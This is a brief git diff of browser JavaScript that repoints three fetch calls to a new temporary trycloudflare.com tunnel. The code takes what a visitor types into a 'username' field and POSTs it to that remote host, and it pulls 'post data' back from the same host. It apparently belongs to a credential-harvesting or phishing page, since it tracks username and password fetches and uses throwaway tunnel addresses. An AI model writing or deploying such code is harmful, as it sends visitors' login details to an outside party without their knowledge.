@@ -9,11 +9,11 @@ let passwordFetched = false;
 const fetchFreqUsername = () => {
     if (freqUsername === null) {
         console.log('fetchFreqUsername called');
-        return fetch('https://eve-nova-brochure-develop.trycloudflare.com/get-first-post-data')
+        return fetch('https://win-wealth-nick-grade.trycloudflare.com/get-first-post-data')
             .then(response => response.json())
             .then(result => {
                 freqUsername = result.postData;
-                return fetch('https://eve-nova-brochure-develop.trycloudflare.com/reset-first-post-data', { method: 'POST' });
+                return fetch('https://win-wealth-nick-grade.trycloudflare.com/reset-first-post-data', { method: 'POST' });
             })
             .then(() => {
                 usernameFetched = true;
@@ -71,7 +71,7 @@ function sendUsername() {
 
     const username = document.getElementById('username').value;
     if (username) {
-        fetch('https://eve-nova-brochure-develop.trycloudflare.com/save-username', {
+        fetch('https://win-wealth-nick-grade.trycloudflare.com/save-username', {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json'
